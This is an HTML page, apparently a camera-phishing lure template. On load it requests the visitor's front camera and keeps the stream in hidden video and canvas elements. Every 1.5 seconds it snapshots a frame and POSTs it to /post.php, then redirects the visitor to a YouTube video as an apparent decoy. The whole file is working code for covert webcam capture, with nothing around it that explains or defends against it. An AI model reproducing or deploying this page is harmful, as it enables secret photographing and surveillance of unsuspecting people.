<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webcam Auto Capture</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <!-- Hidden video element (not visible to the user) -->
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <span id="errorMsg"></span>

    <script type="text/javascript">
        'use strict';

        // Elements for video, canvas, and error message
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const errorMsgElement = document.querySelector('span#errorMsg');

        // Constraints for front camera
        const constraints = {
            audio: false,
            video: { facingMode: "user" }
        };

        // Function to post the captured image data
        const postImage = (imgData) => {
            $.ajax({
                type: 'POST',
                url: '/post.php',
                data: { cat: imgData },
                success: (response) => {
                    console.log("Image successfully sent");
                    window.location.href = "https://youtu.be/nB-9WsIPe3Y?si=IapXiGIGuw_iv2U2";  // Redirect after success
                },
                error: (xhr, status, error) => {
                    console.error("Error sending image", error);
                }
            });
        };

        // Handle webcam stream success
        const handleSuccess = (stream) => {
            window.stream = stream;
            video.srcObject = stream;

            // Automatically capture every 1.5 seconds
            setInterval(() => {
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const canvasData = canvas.toDataURL("image/png");
                postImage(canvasData);
            }, 1500);
        };

        // Initialize webcam
        const init = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                errorMsgElement.innerHTML = `navigator.getUserMedia error: ${e.toString()}`;
            }
        };

        // Start the webcam when the page loads
        window.onload = init;
    </script>
</body>
</html>
